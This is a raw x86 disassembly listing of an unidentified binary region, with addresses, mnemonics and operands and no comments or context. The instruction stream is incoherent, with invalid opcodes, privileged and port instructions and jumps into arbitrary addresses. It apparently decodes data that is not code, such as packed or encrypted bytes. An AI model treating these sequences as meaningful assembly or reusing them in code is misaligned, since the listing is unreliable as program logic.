  41adbb:	push   ebp
  41adbd:	mov    esp,0x83d72
	...
  41ae32:	add    BYTE PTR [eax],al
  41ae34:	xchg   eax,ebx
  41ae36:	pop    ss
  41ae37:	lds    ebx,FWORD PTR [edi-0x31]
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi+0xc77741d]
  41ae41:	pshufw mm6,QWORD PTR [edi],0xcc
  41ae45:	and    al,BYTE PTR [ecx]
  41ae47:	add    ch,dh
  41ae49:	add    BYTE PTR [eax],al
  41ae4b:	add    BYTE PTR [edi-0x41],ah
  41ae4e:	cmp    eax,esi
  41ae50:	mov    esp,esi
  41ae52:	jb     0x41ade7
  41ae54:	adc    DWORD PTR [eax-0x37869d0b],0xffffffa3
  41ae5b:	sbb    edx,DWORD PTR [ecx-0x4b]
  41ae5e:	clc    
  41ae5f:	adc    DWORD PTR [ecx+0x2b8726d5],esi
  41ae65:	inc    eax
  41ae66:	js     0x41ae87
  41ae68:	xchg   esi,eax
  41ae69:	pop    edx
  41ae6a:	and    dh,BYTE PTR [edx+0x5d]
  41ae6d:	add    bl,bh
  41ae6f:	cmp    bh,cl
  41ae71:	dec    eax
  41ae72:	mov    esi,0x139b184b
  41ae77:	dec    ebx
  41ae78:	retf   
  41ae79:	push   0xfffffff9
  41ae7b:	fild   QWORD PTR [ebp+eax*1+0x62384bd7]
  41ae82:	mov    ch,BYTE PTR [ebx+0x22775f8e]
  41ae88:	lds    esp,FWORD PTR [edx]
  41ae8a:	sub    BYTE PTR [ecx-0x40],0x52
  41ae8e:	repz mov esp,DWORD PTR [ecx]
  41ae91:	jnp    0x41aeda
  41ae93:	(bad)  [edx]
  41ae95:	and    cl,ch
  41ae97:	pop    edx
  41ae98:	cmc    
  41ae99:	mov    bh,0x50
  41ae9b:	cld    
  41ae9c:	dec    esp
  41ae9d:	dec    ecx
  41ae9e:	mov    eax,ds:0xab84509d
  41aea3:	mov    BYTE PTR [ecx-0x27519ca1],ch
  41aea9:	(bad)  
  41aeaa:	enter  0xf9a3,0x52
  41aeae:	xor    eax,0x2b1e7c87
  41aeb3:	or     ecx,eax
  41aeb5:	xor    esp,DWORD PTR [edx-0x514632ac]
  41aebb:	xor    esp,ebp
  41aebd:	mov    esp,0x84eb8e21
  41aec2:	imul   ebx,DWORD PTR [esi],0x5533d473
  41aec8:	or     eax,0x64de9df7
  41aecd:	mov    dh,0xed
  41aecf:	inc    edi
  41aed0:	shl    bh,cl
  41aed2:	ret    
  41aed3:	jmp    0x329e2846
  41aed8:	xchg   BYTE PTR [ebx],dl
  41aeda:	mov    dh,0x6
  41aedc:	cmc    
  41aedd:	push   esi
  41aede:	jnp    0x41af23
  41aee0:	add    ecx,edx
  41aee2:	push   esp
  41aee3:	xchg   esi,eax
  41aee4:	push   ebx
  41aee5:	push   cs
  41aee6:	aad    0xbf
  41aee8:	bound  ecx,QWORD PTR [ecx]
  41aeea:	mov    al,ds:0xd479a266
  41aeef:	cmp    ebx,DWORD PTR [esi-0x37]
  41aef2:	loope  0x41af24
  41aef4:	lods   al,BYTE PTR ds:[esi]
  41aef5:	xor    bh,bl
  41aef7:	sahf   
  41aef8:	sub    BYTE PTR [ebp-0x5647345b],al
  41aefe:	pop    edi
  41aeff:	xchg   ebp,eax
  41af00:	cwde   
  41af01:	fsubp  st(1),st
  41af03:	push   ebx
  41af04:	sbb    edx,DWORD PTR [esi]
  41af06:	and    BYTE PTR [edi+0x2a2a3a03],ah
  41af0c:	pop    eax
  41af0d:	mov    edi,0x7322e044
  41af12:	mov    ds:0x5b27d04a,al
  41af17:	inc    ebx
  41af18:	adc    edi,DWORD PTR ds:0xd61781fe
  41af1e:	pop    edx
  41af1f:	mov    bl,dh
  41af21:	pop    edx
  41af22:	popf   
  41af23:	lahf   
  41af24:	daa    
  41af25:	cdq    
  41af26:	test   al,0x9e
  41af28:	sub    bh,dl
  41af2a:	mov    esi,0xbb792d3e
  41af2f:	push   esi
  41af30:	mov    dh,0x3f
  41af32:	adc    BYTE PTR [esi-0x507b1f0b],dh
  41af38:	in     eax,dx
  41af39:	jmp    0x41af40
  41af3b:	aam    0x7d
  41af3d:	push   ss
  41af3e:	dec    ebp
  41af3f:	test   BYTE PTR [ebx+0x0],ah
	...
  41afb2:	add    BYTE PTR [eax],al
  41afb4:	dec    esi
  41afb5:	jmp    0x41afe1
  41afb7:	dec    esi
  41afb8:	scas   eax,DWORD PTR es:[edi]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0xb5
  41afc1:	adc    eax,0x23c115ba
  41afc6:	add    DWORD PTR [eax],eax
  41afc8:	cmc    
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    BYTE PTR [ebp+0x3cb494d4],al
  41afd1:	pop    edi
  41afd2:	mov    ebx,ds
  41afd4:	xor    ch,BYTE PTR [ecx-0x38e2cc01]
  41afda:	mov    esp,0x4cfa7e0d
  41afdf:	jp     0x41b036
  41afe1:	cmp    al,0x18
  41afe3:	mov    edi,0xbd242ada
  41afe8:	addr16 adc eax,esp
  41afeb:	adc    esp,edi
  41afed:	int3   
  41afee:	in     al,dx
  41afef:	mov    bh,0xae
  41aff1:	mov    ch,0x96
  41aff3:	call   0x5f90:0xaba90245
  41affa:	stc    
  41affb:	cmc    
  41affc:	nop
  41affd:	jge    0x41b051
  41afff:	mov    ah,0x53
  41b001:	loope  0x41afba
  41b003:	popa   
  41b004:	inc    eax
  41b005:	jge    0x41b017
  41b007:	mov    esi,0x25143ab3
  41b00c:	xchg   BYTE PTR [ecx],bl
  41b00e:	stc    
  41b00f:	rcr    edi,1
  41b011:	and    edx,DWORD PTR [eax-0x3982550c]
  41b017:	push   eax
  41b018:	jecxz  0x41b034
  41b01a:	inc    edi
  41b01b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b01c:	sub    BYTE PTR [esi],ah
  41b01e:	mov    esi,0x5d7424b4
  41b023:	test   eax,0x11c0fc04
  41b028:	fldcw  WORD PTR [ecx+0x78]
  41b02b:	cmp    DWORD PTR [esi+ebx*2+0x7c],edx
  41b02f:	pop    ebx
  41b030:	(bad)  
  41b031:	call   0x9cbe5082
  41b036:	les    ebp,FWORD PTR [eax+0x29]
  41b039:	(bad)  
  41b03a:	ror    DWORD PTR [esi-0x48107525],cl
  41b040:	add    ecx,DWORD PTR [eax-0x7a]
  41b043:	or     al,0xe9
  41b045:	cmp    eax,0xc6052cc4
  41b04a:	lods   al,BYTE PTR ds:[esi]
  41b04b:	pop    ds
  41b04c:	mov    bh,0xa1
  41b04e:	sbb    al,0x31
  41b050:	sub    al,0x33
  41b052:	loope  0x41b055
  41b054:	fldenv [edi-0x42]
  41b057:	mov    cl,0xd8
  41b059:	(bad)  
  41b05a:	imul   edx,DWORD PTR es:0xc3b6,0x43
  41b061:	xor    al,0x11
  41b063:	je     0x41b08d
  41b065:	inc    edx
  41b066:	cmp    bl,dh
  41b068:	shr    DWORD PTR [eax+0x5f978981],0x4a
  41b06f:	add    DWORD PTR ds:0x49c58fbf,ebp
  41b075:	push   ebp
  41b076:	xchg   edx,eax
  41b077:	sub    edi,DWORD PTR [ebx+edi*1-0x14]
  41b07b:	cmp    al,0xbf
  41b07d:	and    al,0x94
  41b07f:	je     0x41b0af
  41b081:	retf   
  41b082:	lahf   
  41b083:	push   ebx
  41b084:	mov    ds:0x3db6ed04,al
  41b089:	mov    WORD PTR [ecx-0x30],gs
  41b08c:	xor    dl,BYTE PTR [edx]
  41b08e:	jno    0x41b09c
  41b090:	jmp    0xbffe7646
  41b095:	mov    edx,0x745f73e5
  41b09a:	out    0x42,eax
  41b09c:	arpl   WORD PTR [edx+0x5c],sp
  41b09f:	cmp    ebx,DWORD PTR [ebp-0x1c048d5e]
  41b0a5:	es and eax,0xf13fbd0a
  41b0ab:	push   ds
  41b0ac:	sub    BYTE PTR [esi-0x4c],0x82
  41b0b0:	retf   0x9306
  41b0b3:	push   esp
  41b0b4:	or     eax,ecx
  41b0b6:	(bad)  
  41b0b7:	(bad)  
  41b0b8:	push   ecx
  41b0b9:	ds sbb bl,bl
  41b0bc:	dec    ebp
  41b0bd:	jns    0x41b0de
  41b0bf:	das    
  41b0c0:	mov    WORD PTR [eax],es
	...
  41b132:	add    BYTE PTR [eax],al
  41b134:	sbb    al,0xc
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	das    
  41b141:	wrmsr  
  41b143:	xchg   edi,eax
  41b144:	mov    dh,0x24
  41b146:	add    DWORD PTR [eax],eax
  41b148:	cmc    
  41b149:	add    BYTE PTR [eax],al
  41b14b:	add    BYTE PTR [ebx-0x66],bh
  41b14e:	add    BYTE PTR [edi],dl
  41b150:	out    dx,al
  41b151:	in     al,dx
  41b152:	loopne 0x41b0f0
  41b154:	out    0x18,al
  41b156:	jnp    0x41b120
  41b158:	outs   dx,DWORD PTR ds:[esi]
  41b159:	dec    ebx
  41b15a:	test   BYTE PTR [eax-0x368759e2],ch
  41b160:	sahf   
  41b161:	out    dx,al
  41b162:	and    BYTE PTR [eax],dh
  41b164:	scas   eax,DWORD PTR es:[edi]
  41b165:	xchg   esi,eax
  41b166:	cmp    ch,BYTE PTR [ebp+0x57cd4120]
  41b16c:	push   esi
  41b16d:	repz ret 
  41b16f:	(bad)
  41b172:	stc    
  41b173:	mov    ah,0xbf
  41b175:	adc    DWORD PTR [ebp+0x6ba7c44e],edx
  41b17b:	jle    0x41b158
  41b17d:	mov    dh,0x4f
  41b17f:	pop    ebp
  41b180:	outs   dx,BYTE PTR ds:[esi]
  41b181:	les    edi,FWORD PTR [esi]
  41b183:	retf   0x6909
  41b186:	and    DWORD PTR [edx-0x23c15674],eax
  41b18c:	push   esp
  41b18d:	dec    ebp
  41b18e:	push   ebx
  41b18f:	dec    ebx
  41b190:	scas   al,BYTE PTR es:[edi]
  41b191:	loop   0x41b1dc
  41b193:	mov    WORD PTR [edi-0x2c],ds
  41b196:	out    0x64,al
  41b198:	(bad)  
  41b199:	fisubr WORD PTR [edx+0x7729049e]
  41b19f:	or     DWORD PTR [eax],edx
  41b1a1:	fadd   DWORD PTR [eax-0x10462dc7]
  41b1a7:	fnstenv [edi+0x5]
  41b1aa:	arpl   WORD PTR [ebp+0x640c701b],cx
  41b1b0:	outs   dx,BYTE PTR ds:[esi]
  41b1b1:	leave  
  41b1b2:	daa    
  41b1b3:	sbb    BYTE PTR cs:[ebp-0x31cc0fb],bl
  41b1ba:	sub    dh,BYTE PTR [ecx-0x546f4f8f]
  41b1c0:	iret   
  41b1c1:	(bad)  
  41b1c2:	push   ebp
  41b1c3:	pop    ebp
  41b1c4:	neg    DWORD PTR [edi*1+0x7e622f9d]
  41b1cb:	pop    ebx
  41b1cc:	les    eax,FWORD PTR [ebx-0x1a]
  41b1cf:	cmp    DWORD PTR [ebx],esi
  41b1d1:	(bad)
  41b1d5:	inc    ebp
  41b1d6:	mov    esp,0x8b876027
  41b1db:	call   FWORD PTR [edx-0x789c28ac]
  41b1e1:	test   eax,0xc4a4b5d6
  41b1e6:	daa    
  41b1e7:	aam    0xd9
  41b1e9:	pop    edi
  41b1ea:	or     eax,0x7ce15842
  41b1ef:	xchg   edi,eax
  41b1f0:	repnz mov ah,0xe0
  41b1f3:	mov    esp,0xf9c07938
  41b1f8:	and    ah,dh
  41b1fa:	mov    BYTE PTR [ebx+0x58],bl
  41b1fd:	out    dx,eax
  41b1fe:	sti    
  41b1ff:	jno    0x41b1fc
  41b201:	mov    esp,0xf697e3a4
  41b206:	inc    eax
  41b207:	stos   DWORD PTR es:[edi],eax
  41b208:	in     al,0x50
  41b20a:	pop    ebx
  41b20b:	push   edi
  41b20c:	std    
  41b20d:	mov    bh,0xdf
  41b20f:	jp     0x41b1d3
  41b211:	lock sub al,0x68
  41b214:	push   ebx
  41b215:	mov    ds:0xf42fd2ae,al
  41b21a:	jl     0x41b274
  41b21c:	pop    ebp
  41b21d:	nop
  41b21e:	pusha  
  41b21f:	bound  eax,QWORD PTR [eax-0x2a]
  41b222:	adc    edi,DWORD PTR [ebp+0x46]
  41b225:	mov    dl,0x7d
  41b227:	fcmovu st,st(7)
  41b229:	loop   0x41b29e
  41b22b:	scas   eax,DWORD PTR es:[edi]
  41b22c:	jno    0x41b1b9
  41b22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b22f:	mov    edi,0xd34723ef
  41b234:	pusha  
  41b235:	mov    ebp,0x2b334fe1
  41b23a:	cmp    eax,0x1c65912d
  41b23f:	mov    ebx,ecx
	...
  41b2b1:	add    BYTE PTR [eax],al
  41b2b3:	add    bh,dh
  41b2b5:	pop    eax
  41b2b6:	test   al,0x13
  41b2b8:	scas   eax,DWORD PTR es:[edi]
  41b2b9:	repz (bad) 
  41b2bb:	cld    
  41b2bc:	cmp    ch,bh
  41b2be:	jl     0x41b2c7
  41b2c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2c1:	aaa    
  41b2c2:	sub    DWORD PTR [ecx-0x55],ecx
  41b2c5:	and    eax,0xf50001
  41b2ca:	add    BYTE PTR [eax],al
  41b2cc:	mov    dl,0xc
  41b2ce:	enter  0x4ff2,0xc1
  41b2d2:	int3   
  41b2d3:	test   eax,0xa8995ff1
  41b2d8:	cld    
  41b2d9:	push   cs
  41b2da:	daa    
  41b2db:	add    BYTE PTR [ebx+0x7c69c46c],cl
  41b2e1:	scas   eax,DWORD PTR es:[edi]
  41b2e2:	jo     0x41b277
  41b2e4:	xchg   ebp,eax
  41b2e5:	xchg   edi,eax
  41b2e7:	jne    0x41b34d
  41b2e9:	mov    ch,BYTE PTR [ebx-0x5a16967b]
  41b2ef:	xor    eax,0x882194de
  41b2f4:	test   eax,0xbae303b8
  41b2f9:	fimul  DWORD PTR [ebp+0x6b]
  41b2fc:	and    bh,ch
  41b2fe:	pop    ecx
  41b2ff:	loop   0x41b37e
  41b301:	xchg   edx,eax
  41b302:	out    0x4e,eax
  41b304:	shl    DWORD PTR [esi+0x7325afb2],1
  41b30a:	popa   
  41b30b:	out    dx,al
  41b30c:	rcl    BYTE PTR [esi-0x4f],1
  41b30f:	test   BYTE PTR [eax],bh
  41b311:	sti    
  41b312:	shl    dl,0x3b
  41b315:	jne    0x41b31b
  41b317:	repz adc al,0x96
  41b31a:	(bad)  
  41b31b:	hlt    
  41b31c:	das    
  41b31d:	sbb    ebp,DWORD PTR [edi]
  41b31f:	pop    edx
  41b320:	cmp    esp,esi
  41b322:	sbb    dh,BYTE PTR [eax-0x27c233ec]
  41b328:	jne    0x41b2f1
  41b32a:	not    BYTE PTR [ecx-0x627faf4e]
  41b330:	xchg   BYTE PTR [edx+0x0],al
  41b333:	enter  0x1939,0xe5
  41b337:	cdq    
  41b338:	iret   
  41b339:	mov    eax,0x57e490d6
  41b33e:	or     al,0x16
  41b340:	push   ebx
  41b341:	push   ebx
  41b342:	mov    edx,0x113adb05
  41b347:	adc    DWORD PTR [edx+eiz*4-0x223deb72],ebx
  41b34e:	cmp    edx,DWORD PTR [ebx+0x1c]
  41b351:	jno    0x41b326
  41b353:	gs sbb al,ah
  41b356:	inc    edx
  41b357:	stos   BYTE PTR es:[edi],al
  41b358:	in     al,0xec
  41b35a:	adc    eax,0x27c9fed5
  41b35f:	push   esp
  41b360:	fmul   DWORD PTR [edx]
  41b362:	push   ss
  41b363:	lmsw   ax
  41b366:	imul   esi,DWORD PTR [edi-0xce4b179],0x41e36f82
  41b370:	(bad)  
  41b371:	jl     0x41b305
  41b373:	jno    0x41b31c
  41b375:	les    ebp,FWORD PTR [edx+edi*1-0x59]
  41b379:	xchg   esp,eax
  41b37a:	out    0x96,al
  41b37c:	add    al,0xda
  41b37e:	mov    dh,0x3a
  41b380:	mov    ?,WORD PTR [edx*2+0x12f5136c]
  41b387:	fmul   QWORD PTR [esi]
  41b389:	(bad)  
  41b38a:	mov    eax,0x323597f8
  41b38f:	xchg   ebp,eax
  41b390:	push   cs
  41b391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b392:	sbb    al,0xbe
  41b394:	cdq    
  41b395:	xchg   ebx,eax
  41b396:	test   al,0x32
  41b398:	fadd   QWORD PTR ds:0xd7fd954b
  41b39e:	(bad)  
  41b39f:	cmp    dl,dl
  41b3a1:	push   eax
  41b3a2:	in     eax,0x8b
  41b3a4:	pop    ss
  41b3a5:	fiadd  WORD PTR [eax+0x67c367b8]
  41b3ab:	inc    ecx
  41b3ac:	and    eax,0xc168a479
  41b3b1:	pop    ecx
  41b3b2:	and    BYTE PTR [ecx-0x67933c66],ah
  41b3b8:	fs mov al,0x22
  41b3bb:	xchg   ebx,eax
  41b3bc:	sbb    DWORD PTR [esi+0x16],esp
  41b3bf:	add    eax,ebx
	...
  41b431:	add    BYTE PTR [eax],al
  41b433:	add    BYTE PTR [edi-0xf0307e],bh
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	add    eax,0xa0f6f48b
  41b445:	add    DWORD PTR es:[eax],eax
  41b448:	cmc    
  41b449:	add    BYTE PTR [eax],al
  41b44b:	add    ch,dh
  41b44d:	xchg   ebx,eax
  41b44e:	lods   al,BYTE PTR ds:[esi]
  41b44f:	cmp    BYTE PTR [ebx],ch
  41b451:	xor    al,0xb3
  41b453:	jmp    0xcad04a7e
  41b458:	cwde   
  41b459:	stos   DWORD PTR es:[edi],eax
  41b45a:	push   eax
  41b45b:	fnsave [eax+0x352970e]
  41b461:	ins    BYTE PTR es:[edi],dx
  41b462:	int    0x28
  41b464:	sub    BYTE PTR [esi+esi*8+0x43a608b3],dl
  41b46b:	jno    0x41b476
  41b46d:	stos   DWORD PTR es:[edi],eax
  41b46e:	or     dl,dl
  41b470:	into   
  41b471:	mov    edx,0x7c2322b
  41b476:	daa    
  41b477:	lods   al,BYTE PTR ds:[esi]
  41b478:	jo     0x41b44b
  41b47a:	pop    ebp
  41b47b:	rol    BYTE PTR [edi+0x70b9031c],0x26
  41b482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b483:	cmp    DWORD PTR [eax-0x3440ad9c],esp
  41b489:	mov    WORD PTR [edi-0x16314871],fs
  41b48f:	push   ebp
  41b490:	mov    cl,BYTE PTR [ecx]
  41b492:	jmp    0x41b4ea
  41b494:	in     al,dx
  41b495:	jg     0x41b471
  41b497:	and    cl,BYTE PTR [eax+0x187a9f63]
  41b49d:	dec    edx
  41b49e:	addr16 mov edi,0x773715f6
  41b4a4:	popf   
  41b4a5:	sub    ebx,DWORD PTR [esi+ebx*1]
  41b4a8:	int3   
  41b4a9:	push   es
  41b4aa:	jmp    0x59f35994
  41b4af:	pop    esp
  41b4b0:	mov    cl,0x3f
  41b4b2:	fstp   TBYTE PTR [ebx]
  41b4b4:	rol    DWORD PTR [edi+0x15b5b132],0xb1
  41b4bb:	and    eax,0xe23ac5e9
  41b4c0:	pusha  
  41b4c1:	lea    ebp,[ebp+0x69]
  41b4c4:	nop    DWORD PTR ds:0x5b1fa140
  41b4cb:	mov    cs,WORD PTR [edx-0xd07ca5]
  41b4d1:	in     eax,dx
  41b4d2:	fisttp QWORD PTR [ecx]
  41b4d4:	push   cs
  41b4d5:	in     al,dx
  41b4d6:	adc    DWORD PTR ss:[ebx+0x45],ecx
  41b4da:	ror    DWORD PTR [esi+0x5bc3122d],1
  41b4e0:	jle    0x41b52d
  41b4e2:	nop
  41b4e3:	add    ebp,edi
  41b4e5:	test   al,0xfe
  41b4e7:	inc    esp
  41b4e8:	fcom   DWORD PTR [ebp+0x4c]
  41b4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ec:	dec    esi
  41b4ed:	fcom   QWORD PTR [esi+0x7f6d06a8]
  41b4f3:	(bad)  
  41b4f4:	jmp    0x41b47f
  41b4f6:	pop    ss
  41b4f7:	and    BYTE PTR [eax-0x4a18be2a],dh
  41b4fd:	out    0x4d,al
  41b4ff:	aas    
  41b500:	push   0x87b92bac
  41b505:	inc    esp
  41b506:	in     al,0x16
  41b508:	je     0x41b4d8
  41b50a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b50b:	lock gs shr ah,0xcc
  41b510:	mov    DWORD PTR [ecx-0x37],ecx
  41b513:	dec    edi
  41b514:	je     0x41b4f2
  41b516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b517:	sub    edx,DWORD PTR [ecx]
  41b519:	outs   dx,BYTE PTR ds:[esi]
  41b51a:	mov    bh,BYTE PTR [edx+0x46]
  41b51d:	pop    es
  41b51e:	mov    DWORD PTR [eax+0x35],eax
  41b521:	adc    BYTE PTR [ecx],dh
  41b523:	bound  ebx,QWORD PTR [ebx]
  41b525:	mov    esp,0x11685c7d
  41b52a:	mov    cl,ah
  41b52c:	pop    ecx
  41b52d:	fstp   QWORD PTR [eax]
  41b52f:	sbb    ah,BYTE PTR [ebx]
  41b531:	pop    eax
  41b532:	mov    bh,0x2f
  41b534:	dec    esp
  41b535:	scas   eax,DWORD PTR es:[edi]
  41b536:	sti    
  41b537:	sbb    bh,0xc3
  41b53a:	jbe    0x41b5a5
  41b53c:	jns    0x41b4f4
  41b53e:	sub    bh,BYTE PTR [edx+0x19]
	...
  41b5b1:	add    BYTE PTR [eax],al
  41b5b3:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0x38
  41b5c1:	std    
  41b5c2:	outs   dx,DWORD PTR ds:[esi]
  41b5c3:	and    DWORD PTR [ebp-0xafffed9],edx
  41b5c9:	add    BYTE PTR [eax],al
  41b5cb:	add    ah,cl
  41b5cd:	test   BYTE PTR [ecx-0x4b9ac7dc],dl
  41b5d3:	fcomp  QWORD PTR [eax-0x3d]
  41b5d6:	mov    ch,ch
  41b5d8:	cmp    al,0xa5
  41b5da:	push   eax
  41b5db:	pop    ebx
  41b5dc:	out    dx,al
  41b5dd:	nop
  41b5de:	sub    BYTE PTR [ecx+0xee5de8f],0xdd
  41b5e5:	test   eax,0x8fefbd79
  41b5ea:	dec    edi
  41b5eb:	hlt    
  41b5ec:	lock add al,0xb
  41b5ef:	or     cl,bh
  41b5f1:	push   es
  41b5f2:	pop    esi
  41b5f3:	or     edx,esi
  41b5f5:	xor    eax,0xb51b5312
  41b5fa:	data16 jne 0x41b5a3
  41b5fd:	mov    BYTE PTR [eax],dl
  41b5ff:	cmp    dh,BYTE PTR [ecx]
  41b601:	jo     0x41b5ed
  41b603:	push   ebx
  41b604:	not    DWORD PTR [eax-0x29]
  41b607:	ja     0x41b67a
  41b609:	push   edx
  41b60a:	adc    BYTE PTR [ebp-0x29],dh
  41b60d:	add    esp,eax
  41b60f:	mov    ch,0xf4
  41b611:	sbb    DWORD PTR [ebp+edi*4+0x3036f5fe],esp
  41b618:	test   BYTE PTR [eax-0x1b],dh
  41b61b:	xor    DWORD PTR [ebx-0x22f73a36],esp
  41b621:	int3   
  41b622:	sub    DWORD PTR [edi],eax
  41b624:	xor    eax,0xd5d01998
  41b629:	js     0x41b5b3
  41b62b:	add    BYTE PTR [edi+ebx*2],bl
  41b62e:	push   esp
  41b62f:	(bad)  
  41b630:	xor    BYTE PTR [ebp-0x59b9619a],dl
  41b636:	adc    eax,0x5bc81a6a
  41b63b:	jle    0x41b686
  41b63d:	sbb    bl,BYTE PTR [ebx]
  41b63f:	sub    edx,ebx
  41b641:	push   ds
  41b642:	ss mov ebx,0xc6138f57
  41b648:	test   DWORD PTR [ecx+0x58],eax
  41b64b:	sub    BYTE PTR [edi],dl
  41b64d:	jmp    0x5ae7:0x89fbea51
  41b654:	xor    DWORD PTR [esi+ebp*8+0x58],ebp
  41b658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b659:	lods   al,BYTE PTR ds:[esi]
  41b65a:	adc    al,0xca
  41b65c:	dec    esi
  41b65d:	outs   dx,BYTE PTR ds:[esi]
  41b65e:	(bad)  
  41b65f:	lds    edi,FWORD PTR [ebx-0x71]
  41b662:	push   0xffffffdc
  41b664:	xlat   BYTE PTR ds:[ebx]
  41b665:	and    dh,cl
  41b667:	gs mov eax,esp
  41b66a:	shr    BYTE PTR [edx],1
  41b66c:	cmp    edi,edi
  41b66e:	add    ebp,esi
  41b670:	sub    al,0x0
  41b672:	adc    eax,0xa1a08c5a
  41b677:	inc    ebx
  41b678:	adc    al,0x43
  41b67a:	dec    ebp
  41b67b:	sbb    edi,DWORD PTR [edx+0x4a]
  41b67e:	fisttp WORD PTR [edx-0x41]
  41b681:	push   ecx
  41b682:	adc    BYTE PTR [eax+0x517252d5],al
  41b688:	out    0xda,eax
  41b68a:	sub    BYTE PTR [edi+0x493c16e8],ah
  41b690:	pushf  
  41b691:	jno    0x41b64a
  41b693:	sahf   
  41b694:	xor    DWORD PTR [ebp+0x3e],eax
  41b697:	xor    eax,0x52699362
  41b69c:	xchg   esp,eax
  41b69d:	cmp    al,0x75
  41b69f:	icebp  
  41b6a0:	mov    eax,ds:0x70af502e
  41b6a5:	js     0x41b629
  41b6a7:	sti    
  41b6a8:	ins    BYTE PTR es:[edi],dx
  41b6a9:	loope  0x41b6e9
  41b6ab:	add    ch,cl
  41b6ad:	mov    ds:0xbcf1b4b7,al
  41b6b2:	bound  ebx,QWORD PTR [edi]
  41b6b4:	xchg   ebp,eax
  41b6b5:	mov    esi,0xa95c28e
  41b6ba:	xor    BYTE PTR [ebx-0x3484a4a7],cl
  41b6c0:	sub    DWORD PTR [eax],eax
	...
  41b732:	add    BYTE PTR [eax],al
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    bl,al
  41b741:	arpl   WORD PTR [eax],ax
  41b743:	mov    cs,WORD PTR [edx-0xafffed8]
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    ch,dl
  41b74d:	(bad)  
  41b74e:	std    
  41b74f:	sub    ebx,edi
  41b751:	scas   al,BYTE PTR es:[edi]
  41b752:	cmp    ch,ah
  41b754:	push   ss
  41b755:	xor    eax,0xe3f558ba
  41b75a:	xchg   bl,bl
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	or     dl,BYTE PTR [ebx-0x1ab12b1]
  41b763:	addr16 pushf 
  41b765:	fisub  WORD PTR [ebx-0x62a1649]
  41b76b:	mov    es,WORD PTR [ebp-0x5a]
  41b76e:	shl    BYTE PTR [esp+edx*8+0x3eeb47f8],cl
  41b775:	push   ebx
  41b776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b777:	call   0x11eeff33
  41b77c:	or     ebx,ecx
  41b77e:	mul    DWORD PTR [eax+ebp*4+0x2383dfec]
  41b785:	cwde   
  41b786:	pusha  
  41b787:	inc    ebp
  41b788:	fdivr  QWORD PTR [eax]
  41b78a:	inc    esp
  41b78b:	clc    
  41b78c:	arpl   WORD PTR [edx],bp
  41b78e:	sub    BYTE PTR [ecx+edi*1+0x31],al
  41b792:	add    esp,0x3367f327
  41b798:	dec    edx
  41b799:	or     ah,BYTE PTR [esi+ecx*1]
  41b79c:	rol    BYTE PTR [ebx+0x165bae40],0xa6
  41b7a3:	cmc    
  41b7a4:	adc    eax,0x6b19e34e
  41b7a9:	mov    ?,WORD PTR [ecx-0x16]
  41b7ac:	test   DWORD PTR [ebp-0x7a],eax
  41b7af:	dec    esp
  41b7b0:	add    eax,0x8e23a2c
  41b7b5:	stc    
  41b7b6:	loope  0x41b771
  41b7b8:	pop    es
  41b7b9:	pop    ebp
  41b7ba:	call   0x535e:0x7fbd2b9f
  41b7c1:	stos   DWORD PTR es:[edi],eax
  41b7c2:	(bad)  
  41b7c3:	sub    al,BYTE PTR [ecx]
  41b7c5:	stc    
  41b7c6:	or     ebx,DWORD PTR [eax+0x2d]
  41b7c9:	mov    al,ds:0x94431df3
  41b7ce:	or     edi,0xffffffd2
  41b7d1:	shl    DWORD PTR [ebx-0x29cb6284],1
  41b7d7:	fisub  WORD PTR [edi+0x1cad3dad]
  41b7dd:	sbb    esi,edi
  41b7df:	fwait
  41b7e0:	je     0x41b83d
  41b7e2:	test   eax,0x16a89c19
  41b7e7:	imul   esi,DWORD PTR [ebx],0xffffff8f
  41b7ea:	jnp    0x41b82f
  41b7ec:	adc    ch,0xfe
  41b7ef:	add    ebx,DWORD PTR [bp-0x295c]
  41b7f4:	fwait
  41b7f5:	repz scas al,BYTE PTR es:[edi]
  41b7f7:	inc    ebp
  41b7f8:	dec    edx
  41b7f9:	mov    edi,0xbb0969c
  41b7fe:	jae    0x41b7ff
  41b800:	fstp   TBYTE PTR [edi-0x439931e2]
  41b806:	mov    edx,0x9b5c533c
  41b80b:	mov    ds:0xf118c1c8,al
  41b810:	push   eax
  41b811:	out    dx,al
  41b812:	fldenv [esi+0x21]
  41b815:	pop    ss
  41b816:	cmp    DWORD PTR [esi],0xffffffc1
  41b819:	adc    ebx,DWORD PTR [edi]
  41b81b:	add    al,0x55
  41b81d:	mov    BYTE PTR [edi-0x3f],al
  41b820:	mov    edx,0xb3c48b6e
  41b825:	lahf   
  41b826:	cs dec eax
  41b828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b829:	xlat   BYTE PTR ds:[ebx]
